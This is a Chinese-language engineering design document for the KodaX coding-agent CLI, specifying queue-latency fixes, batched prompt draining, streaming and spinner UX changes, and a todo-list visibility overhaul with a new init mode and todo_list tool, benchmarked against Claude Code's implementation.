改 [`queued-prompt-sequence.ts`](../../packages/repl/src/ui/utils/queued-prompt-sequence.ts)：在 `onRoundComplete` 之后 drain **所有**待排队 prompts（而非一次 shift 一条），合并为多个 user message 进 `runRound([...prompts])` 单次 agent 调用。`runRound` 签名从 `(prompt: string)` 改为 `(prompts: string[])`，agent path 把数组拼成多个连续 `{ role: 'user', content: ... }` 块。

**优势**：
- N 条排队从 N 次 agent 调用降到 1 次（cost 节省 ~50-90%）
- LLM 在同一 context 看到全部排队意图，可做整体规划而非孤立处理
- Cache 命中率↑（同一 system prompt + 同一历史只算一次 cache）

#### Slice C：Queue UX 表面（纯 UI，无 eval）

**C1 — Up-arrow popAllEditable**

`PromptFooter.tsx` 输入框为空时按 ↑ 键，把队列内容（按入队顺序拼接，分隔符 `\n---\n`）pop 回输入框，清空队列；用户可编辑/重排后重新 submit。对照 Claude Code `messageQueueManager.ts:428`。

**C2 — 队列每条独立渲染**

`QueuedCommandsSurface.tsx` 改为渲染队列每条（最多 5 条），每条一行 `[1/3] <preview>`，替换当前的 "Queued N follow-ups. Latest: …" 单行摘要。

**C3 — Line-buffered streaming render（实施期 2026-05-09 加入）**

CC naturalness 调研发现 [`REPL.tsx:1473`](c:/Works/claudecode/src/screens/REPL.tsx#L1473)：

```ts
const visibleStreamingText = streamingText && showStreamingText
  ? streamingText.substring(0, streamingText.lastIndexOf('\n') + 1) || null
  : null;
```

KodaX 之前直接把 `streamingResponse` 推到 `pushWrappedRows`——token 流到一半（still-typing 当前行）也实时渲染，造成字符级"跳动"，特别在 reduced-motion 终端 / Windows conhost 下显得不稳。

**实施**：[`packages/repl/src/ui/utils/transcript-layout.ts:757`](../../packages/repl/src/ui/utils/transcript-layout.ts#L757) 在 push 前 `slice(0, lastIndexOf('\n') + 1)`——只显示已结束的完整行，未结束的尾行隐藏直到其 `\n` 抵达。当前轮自然结束时全文进 transcript history（不受 buffer 限制），无尾内容丢失。

**收益**：
- 视觉上行整齐落下而非字符闪烁
- Reduced-motion / Windows conhost 终端下稳定性显著提升
- 与 CC 的"自然书写感"对齐

**C4 — activeForm-driven spinner（实施期 2026-05-09 加入）**

对照 CC [`Spinner.tsx:169`](c:/Works/claudecode/src/components/Spinner.tsx#L169)：
```ts
const leaderVerb = overrideMessage 
  ?? currentTodo?.activeForm    // ← 关键
  ?? currentTodo?.subject 
  ?? randomVerb;
```

CC 的 `TodoWriteTool` 要求 LLM 每个 todo 同时给 `content` (祈使句) 和 `activeForm` (现在进行时)；spinner 在 task 标 `in_progress` 时**立即**从 "Working…" 切到 "Running tests…"——不等任何工具结束。

**实施跨 5 文件**（每改动 < 15 LoC）：
1. [`packages/coding/src/types.ts:TodoItem`](../../packages/coding/src/types.ts) 加 `activeForm?: string` 可选字段
2. [`packages/coding/src/task-engine/todo-store.ts`](../../packages/coding/src/task-engine/todo-store.ts) `TodoInit` + `updateStatus` 接受可选 `activeForm`，preserve-vs-replace 语义同 `note`
3. [`packages/coding/src/tools/todo-update.ts`](../../packages/coding/src/tools/todo-update.ts) 接受 `activeForm` 入参 + 校验 + 透传到 store
4. [`packages/coding/src/tools/registry.ts`](../../packages/coding/src/tools/registry.ts) `todo_update` schema 加 `activeForm` 字段 + 描述教 LLM 必填（status='in_progress' 时）
5. [`packages/repl/src/ui/InkREPL.tsx`](../../packages/repl/src/ui/InkREPL.tsx) `currentTodoActiveForm = useMemo(...)` 找首个 `in_progress` 项的 activeForm，传入 `buildTranscriptRenderModel`
6. [`packages/repl/src/ui/utils/transcript-layout.ts`](../../packages/repl/src/ui/utils/transcript-layout.ts) spinner 级联中：activeForm 优先于 currentTool / isThinking 通用 fallback（但仍让位于 isCompacting 与 shouldRenderLiveToolBlock 的详细工具块）
7. [`packages/coding/src/task-engine/_internal/managed-task/role-prompt.ts`](../../packages/coding/src/task-engine/_internal/managed-task/role-prompt.ts) Scout + Generator role-prompts 加引导 LLM 在 `status='in_progress'` 时**总是**附 activeForm

**Spinner 优先级（KodaX）**：
1. `isCompacting` → "Compacting"
2. `shouldRenderLiveToolBlock` → "[Tools] N running, ..." 详细块
3. **`currentTodoActiveForm` → "[Plan] Running failing tests..."**（新）
4. `currentTool` → "[Tool] read /path/file"
5. `isThinking` → "[Thinking] processing"
6. fallback → "Thinking"

**收益**：
- 用户看到 "[Plan] Refactoring auth module..." 比 "[Thinking] processing..." 信息量大得多
- 不需要等任何 tool 调用完成；LLM 调 todo_update 那一瞬间 spinner 就更新
- 与 CC 的"agent 在做什么显式"对齐

**C5 — Bash live progress (`renderToolUseProgressMessage` 等价)（实施期 2026-05-09 加入）**

对照 CC `BashTool.renderToolUseProgressMessage()` + `BashModeProgress.tsx`：CC 把 child 进程的 stdout 实时推到 transcript，用户看 `npm test` output 一行行往下滚（跟手动跑命令一样）。KodaX 之前 bash 工具缓冲全部 output 到结束才返回——30s `npm test` 期间用户看不到任何反馈。

**关键发现**：基础设施全已就位
- `KodaXToolExecutionContext.reportToolProgress?: (msg: string) => void` 已存在 ([types.ts:1346](../../packages/coding/src/types.ts#L1346))
- `KodaXEvents.onToolProgress?: (update: { id, message }) => void` 已存在 ([types.ts:171](../../packages/coding/src/types.ts#L171))
- `dispatch_child_task` 已经在用（[dispatch-child-tasks.ts:84](../../packages/coding/src/tools/dispatch-child-tasks.ts#L84)）
- `bash.ts` 之前**没**接通

**实施**：[`packages/coding/src/tools/bash.ts:229-234`](../../packages/coding/src/tools/bash.ts#L229) `proc.stdout?.on('data')` / `proc.stderr?.on('data')` handler 中：
- 维护一个 1KB UTF-8 文本 tail buffer（与 512KB 全捕获 collector 分离，cheap）
- 每个 chunk 后 throttle 100ms 调 `ctx.reportToolProgress(tail)`，传最后 3 行非空内容拼成单行
- stderr 也走同条 tail（npm/cargo/pytest 进度大多在 stderr）
- ~120 char 超长截断带 `…` 前缀

**收益**：
- 长 bash（`npm test` / `cargo build` / `pytest`）执行时用户看到实时进度
- 与 CC 体验对齐——不再 30s "Working..."
- 完全 backward-compat：`reportToolProgress` 未传时 no-op，所有既有测试 pass

**测试**：[`packages/coding/src/tools/bash.test.ts`](../../packages/coding/src/tools/bash.test.ts) 加 3 case：
1. 5-line 节奏脚本验证 progress events 收到 + 含 stdout 内容
2. `reportToolProgress` 未传时不抛异常（back-compat）
3. stderr 也进 progress（npm/pytest 进度通常 stderr）

### 影响范围

**新增**：
- `packages/coding/src/context/agents-loader-cache.ts`：mtime cache helper（~30 行 + ~50 行 test）
- `tests/feature-149-queue-injection-latency.test.ts`：A1/A2/A3 单测（验证 setTimeout 已移除 + cache 命中行为 + round-complete 信号无 80ms 抖动）
- `tests/feature-149-interruptible-tool-abort.test.ts`：B1/B2 单测
- `tests/feature-149-batched-drain.test.ts`：B3 单测
- `tests/feature-149-queue-ux.eval.ts`：FEATURE_104 prompt eval — 5 alias × 4 task = 20 cells，验证批量 drain 后 LLM 处理多 user message 不退化（ds/v4flash + kimi + zhipu/glm51 + mimo/v25 + ark/glm51）
- `docs/test-guides/FEATURE_149_v0.7.38_TEST_GUIDE.md`：人测引导（4 维度：注入感知延迟 / 长 bash 中断 / 多条排队 cohesion / up-arrow 编辑）

**修改**：
- `packages/repl/src/ui/InkREPL.tsx`：`stageQueuedPrompt` 移除 setTimeout + `flushSync`；`handleSubmit` fast-abort 分支（~20 行）
- `packages/coding/src/context/agents-loader.ts`：接通 cache helper（~10 行）
- `packages/repl/src/ui/utils/queued-prompt-sequence.ts`：`runRound` 签名 `string` → `string[]`，drain 所有 pending（~30 行重构）
- `packages/repl/src/ui/contexts/StreamingContext.tsx`：(可选) `useSyncExternalStore` 改造（~30 行）
- `packages/coding/src/tools/types.ts`：新增 `interruptBehavior` 字段（~3 行）
- `packages/coding/src/tools/bash.ts` / `sleep.ts` / `dispatch_child_task.ts`（同步 await 路径）：标 `interruptBehavior: 'cancel'`
- `packages/coding/src/agent-runtime/runner-driven.ts`：abort 分支合成 `tool_result` error block（~20 行）
- `packages/repl/src/ui/components/PromptFooter.tsx`：↑ 键 popAllEditable（~15 行）
- `packages/repl/src/ui/components/QueuedCommandsSurface.tsx`：多条渲染（~30 行）

**不改动**：
- ESC 行为（仍然是"清空队列 + abort 当前轮"，与 B1 fast-abort 互补不冲突）
- `MAX_PENDING_INPUTS = 5` 上限（用户实战未触顶）
- runner 主循环 / session 持久化 / compaction（与 queue path 正交）

### 实施顺序（Phase 化，每 phase 独立可 ship）

1. **Phase 1 — Slice A 延迟清理（零行为变更）**：A1 + A2 + A3 + A4，~1 天，**无需 prompt eval**，`v0.7.38` 主线第一波 ship
2. **Phase 2 — Slice C UX 表面**：C1 + C2，~0.5 天，纯 UI，与 Phase 1 并行
3. **Phase 3 — Slice B 行为变更**：B1 + B2 + B3，~2 天，**触发 prompt eval**（20 cells × 5 alias = 100 cells，预算 ~$8），FEATURE_104 harness mean ≥ baseline 通过率为 ship gate

Phase 3 eval 不过门 → 单 slice 回退到 v0.7.38.1 patch，Phase 1+2 ship 不阻塞。

### 验收标准

1. **延迟可量化**：新增 micro-benchmark `tests/queue-injection-latency.bench.ts`，模拟 round 完成 → 下一 prompt `runRound` 调用的 wall-clock，**floor 必须 < 5ms**（移除 50ms 后的物理底线）
2. **AGENTS.md cache 命中**：unit test 验证同 cwd 第二次 `loadAgentsFiles` 调用 0 次 `readFileSync`（mtime 未变时）
3. **Bash 长跑可中断**：人测引导 — `bash` 跑 30s sleep 时按 Enter 提交新 prompt，**500ms 内**新 prompt 起轮（B1 fast-abort 验证）
4. **批量 drain cohesion**：5 条排队 prompts 触发 1 次 agent 调用（不是 5 次），LLM 输出体现整体规划意识（人测主观判断 + cost tracker `agentInvocationCount` 字段）
5. **Up-arrow editable**：人测 — 输入框为空时按 ↑ 把队列 pop 回输入框，清空队列状态指示
6. **跨 family 不退化**：B3 prompt eval 5 alias mean ≥ baseline，max-min spread ≤ 15pp
7. **既有测试全绿**：`packages/repl/src/ui/utils/queued-prompt-sequence.test.ts` + `pending-inputs.test.ts` + `StreamingContext.queue-mirror.test.ts` 全绿（签名变更可改测试，行为变更不可）
8. **零 known regression**：FEATURE_115 Message Queue Foundation / FEATURE_119 Pattern B / FEATURE_111 soft-pause（v0.7.43 未实施，不冲突）路径全绿

### 非目标

- **不**实现 Claude Code 的 Council / multi-advisor consult（FEATURE_105 v0.7.46 范围）
- **不**实现连续跨轮"流式不间断"幻觉（KodaX `setIsLoading` 已经在序列期间持续 true，spinner 不闪烁，本身就对）
- **不**改 ESC 语义（保持"清空队列 + abort"双效，避免破坏 Issue 116 修复）
- **不**给 mid-tool-call 注入工具结果（B1/B2 是中断不是注入）
- **不**实现 input-as-async-generator 架构改造（与 Claude Code 同模型，state-setter 即可，不上 generator pull channel）
- **不**改 `MAX_PENDING_INPUTS` 上限或加 priority 字段（FEATURE_115 已经做 2 档优先级，本 feature 不重叠）
- **不**做 advisor 风格的 mid-turn 第二 LLM 咨询（与 queue 无关）
- **不**为 `setTimeout(50)` 写单测保护（直接删，`bench.ts` 是更好的回归 gate）

### 与其他 Feature 的关系

- **互补 FEATURE_115（v0.7.36 已 ship）**：Message Queue Foundation 解决 agentId-scoped + Sleep-gated mid-turn drain（agent 间消息），FEATURE_149 解决 user → agent 排队 UX——两层不同语义的队列，正交
- **互补 FEATURE_119（v0.7.36 已 ship）**：Pattern B launch+await 让 Worker 不阻塞，FEATURE_149 让 user 排队不阻塞——上下两层 async parity
- **依赖 FEATURE_111 设计稿（v0.7.43 计划）**：Soft-pause 的 `<user-interjected mid-task>` 标签思路与 B1 fast-abort 同源，FEATURE_149 B1 不上 pause 状态机（避免与 ESC 双 abort 路径混淆），111 落地时再加 pause UX
- **正交 FEATURE_117（同版本）**：117 改 child path system prompt，149 改 user input path 延迟，无重叠
- **正交 FEATURE_116（v0.7.37 已 ship）**：cache_control 减少 stable system prompt 重复计费，A2 mtime cache 减少 disk I/O，两层不同 cache

### 参考

- Claude Code queue path：`c:/Works/claudecode/src/utils/handlePromptSubmit.ts:313-351`、`utils/queueProcessor.ts:52-87`、`utils/messageQueueManager.ts:128/428`、`hooks/useQueueProcessor.ts:43-47`
- Claude Code abort path：`c:/Works/claudecode/src/query.ts:839/1015-1051`、`utils/abortController.ts:16`、`hooks/useCancelRequest.ts:97-102`
- Claude Code mtime cache：`c:/Works/claudecode/src/services/claudemd.ts`、`utils/fileReadCache.ts`
- Claude Code naturalness 调研（2026-05-09 实施期 deep dive）：[`REPL.tsx:1473`](c:/Works/claudecode/src/screens/REPL.tsx#L1473) 流式行 buffer / [`Spinner.tsx:169`](c:/Works/claudecode/src/components/Spinner.tsx#L169) `currentTodo?.activeForm` / [`PromptInputQueuedCommands.tsx:71-114`](c:/Works/claudecode/src/components/PromptInput/PromptInputQueuedCommands.tsx) 多行队列预览 / [`StreamingToolExecutor.ts:255-259`](c:/Works/claudecode/src/services/tools/StreamingToolExecutor.ts#L255) hasInterruptibleToolInProgress = `every(t => 'cancel')`
- KodaX queue path：[`InkREPL.tsx:6255-6300`](../../packages/repl/src/ui/InkREPL.tsx#L6255-L6300)、[`queued-prompt-sequence.ts`](../../packages/repl/src/ui/utils/queued-prompt-sequence.ts)、[`pending-inputs.ts`](../../packages/repl/src/ui/utils/pending-inputs.ts)、[`StreamingContext.tsx:330-480`](../../packages/repl/src/ui/contexts/StreamingContext.tsx#L330-L480)
- Forensic latency trace：本 feature 立项基于 2026-05-08 双向 source 对照（KodaX vs `c:/Works/claudecode/src/`），smoking-gun = `InkREPL.tsx:6267` + `agents-loader.ts:70` 无缓存 + `StreamingContext.tsx:344` 80ms FLUSH

### CC naturalness 调研收口

实施期 2026-05-09 deep dive 对照 CC 发现 5 个"自然顺滑"机制，全部在 v0.7.38 内处理（不 defer）：

1. **`activeForm`-driven spinner**：✅ ship as **C4**（详见上文）
2. **`renderToolUseProgressMessage` per-tool live stdout**：✅ ship as **C5**（详见上文）
3. **跨轮 streaming 不间断幻觉**：KodaX [`StreamingContext.tsx`](../../packages/repl/src/ui/contexts/StreamingContext.tsx) `setIsLoading` 在 batch drain 期间已经持续 true，**已对齐**，无需改动
4. **Esc pop queue tail**：CC [`useCancelRequest.ts:87-122`](c:/Works/claudecode/src/hooks/useCancelRequest.ts#L87) 优先级 2 是 `popCommandFromQueue()`，KodaX [`InkREPL.tsx:4201`](../../packages/repl/src/ui/InkREPL.tsx#L4201) `removeLastPendingInput()` 同语义，**已对齐**
5. **Sync enqueue → input clear**：CC [`handlePromptSubmit.ts:336-349`](c:/Works/claudecode/src/utils/handlePromptSubmit.ts#L336) `enqueue()` 后同步 `onInputChange('')`，KodaX [`InkREPL.tsx:6565-6577`](../../packages/repl/src/ui/InkREPL.tsx#L6565) `addPendingInput(fullText); setInputText("")` 同步连发，**已对齐**

### Queue parity audit（2026-05-09，14 维度系统对照）

第二轮 CC 对照覆盖 14 个 queue 维度。结果：12 维度 **ALIGNED**，1 维度 **GAP（已修）**，1 维度 **N/A**（KodaX 未引入相关功能）：

| 维度 | 结果 | 备注 |
|---|---|---|
| 1. Mode 字段 | MINOR-DRIFT | KodaX queue 项是 `string`，CC 是 `QueuedCommand{mode,uuid,...}`。KodaX 不分 `! bash` 模式，无需。Slash 命令通过 #3 修复 |
| 2. State trigger 条件 | MINOR-DRIFT | KodaX 用 `isLoading`，CC 用 `queryGuard.isActive \|\| isExternalLoading`。`isExternalLoading` 仅在 CC 的远程会话 / 后台前台化场景需要，KodaX 暂无此特性，N/A |
| 3. **Slash 命令排队** | **GAP → 已修** | **C6 实施**（见下文） |
| 4. 图片 / paste attachments | system-wide 限制 | KodaX **直接提交**路径就不传 `pastedContents` 到 agent，与 queue 无关。文本 paste 通过 `fullText` 内联保留 |
| 5. UUID 跟踪 | MINOR-DRIFT | KodaX 队列项无 uuid。当前无 telemetry / undo 依赖；defer |
| 6. 无 task 时直接提交 | ALIGNED | 两边都 fallthrough 到直接执行 |
| 7. Race（轮结束 mid-Enter） | MINOR-DRIFT | KodaX 用 React state closure，stale window < 一帧，实际无害 |
| 8. ↑ pop queue 优先于 history | ALIGNED | 两边都 empty buffer + queue non-empty → pop |
| 9. MessageQueue (FEATURE_115) sync | ALIGNED | 同步 reducer，无 race |
| 10. `isExternalLoading` | N/A | KodaX 暂无远程会话特性 |
| 11. 队列视觉反馈 | ALIGNED | KodaX `QueuedCommandsSurface` 多行 [i/N] 渲染 |
| 12. Drain FIFO 顺序 | ALIGNED | KodaX `shiftPendingInput` head shift = FIFO |
| 13. MAX_PENDING_INPUTS 上限 | MINOR-DRIFT | KodaX 5，CC 无硬上限。当前是有意 UX 政策 |
| 14. Esc abort 时 queue 处理 | ALIGNED | 默认清空 / fast-abort `preservePendingInputs:true` 保留 / Esc pop tail，三套语义齐全 |

**C6 — Slash 命令 mid-task 拒绝排队（实施期 2026-05-09 加入）**

发现 P0：CC `queueProcessor.ts:70` 在 dequeue 时把 slash 命令单独走 command pipeline。KodaX 队列把所有项当 plain text，drain 时 `runQueuedPromptSequence` verbatim 给 agent——**用户在 loading 时按 Enter 发 `/cost` 会被 LLM 当字符串收到**，明显错误。

**实施**（[`packages/repl/src/ui/InkREPL.tsx:6571`](../../packages/repl/src/ui/InkREPL.tsx#L6571)）：在 `handleSubmit` 的 isLoading 分支，检测 slash 前缀就 `emitInfoItemToCorrectLayer` 显示友好提示并 `return`——不入队、不丢、不当 plain text 发出去。

```ts
if (fullText.trimStart().startsWith('/')) {
  emitInfoItemToCorrectLayer({
    type: "info",
    icon: "⚠",
    text: 'Slash commands cannot be queued mid-task. Press Esc to abort the current task, then run the command.',
  }, 'queue-limit');
  return;
}
```

**对照 CC 的差异**：CC 实际上做得更多——区分 "immediate local-jsx commands"（如 `/help` / `/cost`）可以在 loading 中**立即同步执行**，与 "long-running slash commands" 进队列单步执行。KodaX 走的是更保守路径（拒绝 + 提示）。Future v0.7.39+ 可以分层加入 immediate-execute 路径。

**FEATURE_149 v0.7.38 最终 ship 边界**：Slice A（latency 清理）+ Slice B（B1 infra-only + B3 batched drain）+ Slice C（C1 up-arrow + C2 multi-line queue + C3 line-buffered streaming + **C4 activeForm spinner** + **C5 bash live progress** + **C6 slash-mid-task guard**）。CC 调研 5 项 + queue parity 14 维度全部 ship 或确认对齐。剩余 minor-drift 项（mode 字段 / uuid / MAX_PENDING_INPUTS 上限）经审查均不影响用户体验，留 v0.7.39+ 视实际反馈再处理。

---

## FEATURE_151: TodoList Visibility & LLM Self-Seeding Parity — Closing the FEATURE_097 Coverage Gap

**Status**: Planned
**Priority**: High
**Category**: Enhancement / UX
**Released in**: v0.7.38

### 背景：用户感知的覆盖缺陷

FEATURE_097 (v0.7.34) 引入 Claude-Aligned Realtime Todo List；v0.7.35.1 hotfix 修了两个 P0 latent bug（parser + prompt 让 runtime seeding gate 永远不触发）；v0.7.38 FEATURE_149 Slice C4 加了 `activeForm` spinner。代码层面全链路存在，但**用户报告依旧很少看到计划列表**。

把 KodaX 与 `c:/Works/claudecode/src/` 实际代码做了一次 14 维度对照，发现 5 道 gate 叠加导致用户感知层接近 0%：

| # | Gate | 位置 | 现状 | CC 对应 |
|---|---|---|---|---|
| G1 | **没有"LLM 自主创建列表"的工具** | `todo_update` 必须给 id 更新已有项 | 🔴 LLM 无法 init 空 store | CC `TodoWrite` 是全列表写入 |
| G2 | Scout `obligations.length >= 2` 硬 gate | [`runner-driven.ts:889`](../../packages/coding/src/task-engine/runner-driven.ts#L889) | 简单任务 / Scout 不 emit 都失败 | CC 无 Runner-driven 路径 |
| G3 | UI **`MIN_ITEMS_TO_RENDER = 2`** | [`todo-plan.ts:31`](../../packages/repl/src/ui/view-models/todo-plan.ts#L31) | 1 项不渲染 | CC `tasks.length === 0` 才不渲染（即 `> 0` 就显示）|
| G4 | `hasItems()` reminder 死锁 | [`todo-throttle-reminder.ts:97`](../../packages/coding/src/task-engine/todo-throttle-reminder.ts#L97) | 空 store 永不提醒 → LLM 永不知 todo 存在 | CC `getTodoReminderAttachments` 每 10 轮无条件提醒 |
| G5 | 仅 `showSpinner === true` 时挂载 + 5 秒 linger 销毁 | [`InkREPL.tsx:7429`](../../packages/repl/src/ui/InkREPL.tsx#L7429) + [`InkREPL.tsx:3213-3224`](../../packages/repl/src/ui/InkREPL.tsx#L3213-L3224) | idle 期消失，5s 后清空 React state | CC 整 session 持续可见（`expandedView==='tasks'`）|

**G1 是最深的根因**：即使把 G2-G5 全部放宽，KodaX 的 LLM **没有任何工具能从空 store 创建一个新列表**。`todo_update` schema 要求 `id` 必填且必须存在；Scout `obligations >= 2` gate 之外没有第二条种入路径。

### 设计：3 个 Slice，对齐 CC

#### Slice A — UI Parity（与 CC TaskListV2 视觉门槛对齐）

| Change | 文件 | Before | After |
|---|---|---|---|
| MIN_ITEMS_TO_RENDER | `todo-plan.ts` | `2` | `1`（与 CC `tasks.length === 0` 等价反向）|
| Post-completion linger | `todo-plan.ts` + `InkREPL.tsx` | 5s 后 hide + clear state | hide + clear 都移除；items 持续可见直到下次 init replace |
| showSpinner mount gate | `InkREPL.tsx:7429` | `showSpinner ? <surface> : undefined` | items 非空就挂载，与 spinner 状态解耦 |

**为什么不放开 Scout `>= 2` gate（G2）**：CC 的 prompt 强烈引导模型对 `< 3` step 任务不要用 TodoWrite（[`TodoWriteTool/prompt.ts:17-26`](c:/Works/claudecode/src/tools/TodoWriteTool/prompt.ts#L17)）。等价 KodaX 策略是保留 Scout `>= 2` 硬 gate（不动 G2），但允许 Scout 错过的多步骤任务通过 LLM 自主 init（B1）补救。

#### Slice B — LLM Self-Seeding（架构补齐 G1）

##### B1: `todo_update` 增加 `op: 'init'` 模式

```ts
// 新 schema（向后兼容；省略 op 等价于 op: 'update'）
{
  op?: 'init' | 'update',  // 默认 'update'
  // op='init' 时使用：
  items?: [{id: string, content: string, activeForm?: string}],
  // op='update' 时使用（与 v0.7.34 完全一致）:
  id?: string,
  status?: 'in_progress' | 'completed' | 'failed' | 'skipped',
  note?: string,
  activeForm?: string,
}
```

**语义**（mirrors CC `TodoWrite` 的全列表写入）：
- `op='init'` + 空 store → 创建新列表（替代 Scout init() 路径）
- `op='init'` + 已有 store → **完全替换**（CC `TodoWrite` 行为）
- `op='update'` + id 不存在 → 现有 unknown-id 错误路径不变

实现：[`todo-store.ts`](../../packages/coding/src/task-engine/todo-store.ts) 已有 `init(seeds)` 方法，B1 只是把它从 Runner-only 暴露给 LLM。

##### B2: `todo-throttle-reminder.ts` 移除 `hasItems()` gate

[`shouldFireTodoReminder`](../../packages/coding/src/task-engine/todo-throttle-reminder.ts#L93) 的 `if (!todoStore.hasItems()) return false;` 移除。文案分两支：

```
<system-reminder>
[空 store 分支]
You have not committed a plan in N rounds. If this task has ≥2 distinct
steps, call todo_update with op="init" to commit a plan now (e.g.,
todo_update({op:"init", items:[{id:"todo_1", content:"...", activeForm:"..."}, ...]})).
Trivial single-step tasks may proceed without a plan.
</system-reminder>

<system-reminder>
[非空 store 分支 — 不变]
You have not called todo_update in N rounds. Pending items: ...
If you have started or finished any of these, call todo_update now.
</system-reminder>
```

##### B3: Role prompts 同步更新

- `role-prompt.ts` Scout/Generator/Planner 三个 role 各自的 todo_update guidance 段加一段：「If no plan was seeded by Runner (你的任务不到 2 步 obligations，但仍属 ≥2 distinct steps)，you may call todo_update with op:"init" to commit your own plan」。
- `registry.ts` `todo_update` description 更新，包含 `op` 字段说明。

#### Slice C — Persistent Visibility（对齐 CC `expandedView==='tasks'` 持久语义）

- 删除 [`InkREPL.tsx:3209-3224`](../../packages/repl/src/ui/InkREPL.tsx#L3209) 的 5 秒 timer + `setTodoItems([])` 强制清空逻辑
- `todoLastAllCompletedAt` state 仍保留（其他逻辑可能用到），但不再驱动 unmount
- React state `todoItems` 自然跨 AMA 任务持续；下一个 task 的 Scout `init()` 或 LLM `op:'init'` 调用会触发 `replace()` → `onChange` → `setTodoItems(newItems)` 自动覆盖

**stale-state 风险评估 + 处置**（独立 reviewer 升级为 fix-now）：相邻两个不相关的 prompt（A=「fix bug」，B=「show me README」），如果 A 触发 todo list 而 B 是 trivial Scout 不 seed，B 的整个执行期会显示 A 残留的 ✓✓✓。**已修**：5 个 session-boundary callback（`/clear` 即 `clearHistory`、新 session、`loadSession`、tree-switch、fork、`rewindSession`）全部加 `setTodoItems([])`，与 CC `expandedView` 在 session 边界自然 reset 一致。

#### Slice D — `todo_list` 查询工具（与 CC `TaskListTool` 对齐）

CC 的 [`TaskListTool`](c:/Works/claudecode/src/tools/TaskListTool/TaskListTool.ts) 给 LLM 一个**显式 read-back 通道**——空 input，输出当前完整列表 JSON。LLM 用它做：
- 收到 `Unknown todo id` 错误后取 canonical id 集合
- 长 idle 之后（throttle reminder 触发后）回到上下文，先确认还有什么 pending
- Planner 把 refined `success_criteria` 跟 Runner-seeded list 对照，决定是否 `op:'init'` 替换

KodaX 实施 ([`packages/coding/src/tools/todo-list.ts`](../../packages/coding/src/tools/todo-list.ts))：
- 工具名 `todo_list`，input schema `{}`（`additionalProperties: false`）
- Output `{ ok: true, count: N, items: [{id, content, status, activeForm?, note?}, ...] }`，可选字段 absent 时**不输出 key**保 prompt-cache 稳定
- 空 store soft-fail：`{ ok: false, reason: "todo_list is not active ..." }`，对齐 `todo_update` 的 graceful-degradation 契约
- Read-only：永不 `onChange` fire；contract test pinning
- 注入 Scout / Planner / Generator 三角色（与 `todo_update` 同范围）

#### Slice E — Hidden tool calls（transcript noise 清理）

CC 的三件套 `TodoWriteTool` / `TaskCreateTool` / `TaskUpdateTool` / `TaskListTool` 全部用 `shouldDefer: true + renderToolUseMessage() => null + userFacingName() => ''`，从用户 transcript 完全隐藏——用户只看 TodoListSurface 的可视化更新。

KodaX 现状：[`isVisibleToolName`](../../packages/coding/src/agent-runtime/event-emitter.ts#L53) 钩子目前只过滤 `emit_managed_protocol`。Generator 一轮里调 `op:'init'` + `in_progress` + `completed` × N 会在 transcript 出现 N+1 个 `[Tool todo_update] ... → {ok:true}`，纯噪音。

修法：把 `todo_update` + `todo_list` 加进新的 `HIDDEN_TODO_TOOL_NAMES` set。Pin in [CAP-035 contract test](../../packages/coding/src/agent-runtime/__contract-tests__/cap-035-tool-visibility.contract.test.ts)（新增 case `001d`）。

#### Slice F — Spinner verb fallback chain（与 CC `Spinner.tsx:169` 对齐）

CC 行为：spinner 字符串构造为 `overrideMessage ?? currentTodo?.activeForm ?? currentTodo?.subject ?? randomVerb`——**`activeForm` 缺失时回退到 `subject`（KodaX 的 `content`），最后才是默认随机 verb**。

KodaX 既存：[`InkREPL.tsx:1512`](../../packages/repl/src/ui/InkREPL.tsx#L1512) 的 `currentTodoActiveForm` useMemo 只检查 `activeForm`，缺失就直接放弃。

修法：扩展 fallback 链为 `activeForm > content > undefined`。即便 LLM 漏了 `activeForm`（role-prompt 强制要求但仍可能发生），用户至少看到带语义的文案（"Run failing tests"）而不是无信号的默认 verb。

#### Slice G/H — TodoListSurface 嵌入式渲染（CC `MessageResponse` + `TaskListV2 isStandalone=false` 对齐）

**用户决策（2026-05-09）**：KodaX 默认状态对齐 CC 的"嵌入 spinner"视觉风格。Todo list 不应抢占屏幕，应当作为 spinner 活动的子项展开。两次迭代：

##### Slice G（首次切，被推翻）

初次实施删了 `"X/N completed"` 计数器 header，保留每行 `▏` 竖线 gutter。**用户验收时指出问题**：删 counter 是过度切除（counter 没毛病、信息有用），而真正的"面板感"来自每行重复的 `▏`，那个才是该改的。Slice G 的产出全部回滚。

##### Slice H（最终方案）

视觉锚点改成 CC 的 [`MessageResponse.tsx:22`](c:/Works/claudecode/src/components/MessageResponse.tsx#L22) 包装器结构——`⎿` 只渲染**一次**作为 flex-row 的左列，右列是多行 rows，Ink 行布局让后续行自然在左列空白下方右对齐到 row 内容起点：

```tsx
// CC MessageResponse.tsx:22 verbatim
<Box flexDirection="row">
  <Text dimColor>{"  ⎿  "}</Text>     // 5-char left column, ONE line
  <Box flexShrink={1} flexGrow={1}>   // right column, multi-row content
    {children}
  </Box>
</Box>
```

KodaX `TodoListSurface` 套同款结构：
- **Counter line 保留**——`X/N completed` 右对齐顶部 dim 文本（用户反馈：这条删了没必要，信息有用 + 不抢占视觉焦点）
- **`▏` per-row gutter 完全删除**——这个才是"小面板边框"feel 的来源
- **新增 `⎿` 一次性 connector**——左列 `"  ⎿  "` (U+23BF + 前后空格)，dim color；右列是 `Box flexDirection="column"` 包 rows
- **`completedCount` / `totalCount` view-model 字段保留**——是数据不是 UI 决策；未来如果加 inline progress badge 辅助 surface 还可以消费

##### Slice H'（最最终方案，2026-05-09 用户第三轮反馈）

Slice H 把 spinner 摆在 todo 块**底部**导致视觉割裂感（用户："好丑啊"），且 counter 单独占顶部一行浪费纵向空间。最终方案：

- **counter 移出 `TodoListSurface`**，放到 `InkREPL.tsx` 的 `activityBar` slot 里跟 spinner verb 同行（左 spinner、右 counter，flex-row + flexGrow 推开）
- **`TodoListSurface` 专职渲染 `⎿` 块 + rows**，本身已经是 flex-row 嵌入结构
- 当无 spinner 但有 todos 时，activityBar 也会 mount 仅渲染 counter（保 idle-with-completed-todos 场景的可见性）

视觉对比（**最终落地**）：

```
v0.7.34（原始）—— 抢占视觉的小面板：
                          1/3 completed
  ▏ ✓ Add unit test
  ▏ ● Run failing tests
  ▏ ☐ Wire CI
⠋ Running tests…

Slice G（被推翻）—— 删 counter，▏ 还在：
  ▏ ✓ Add unit test
  ▏ ● Run failing tests
  ▏ ☐ Wire CI
⠋ Running tests…

Slice H（被推翻）—— ⎿ 嵌入但 spinner 在底，且 counter 占独立一行：
                          1/3 completed
  ⎿  ✓ Add unit test
     ● Run failing tests
     ☐ Wire CI
⠋ Running tests…

Slice H'（最终）—— spinner+counter 同行，⎿ 嵌入在下方：
⠋ Running tests…                  1/3 completed
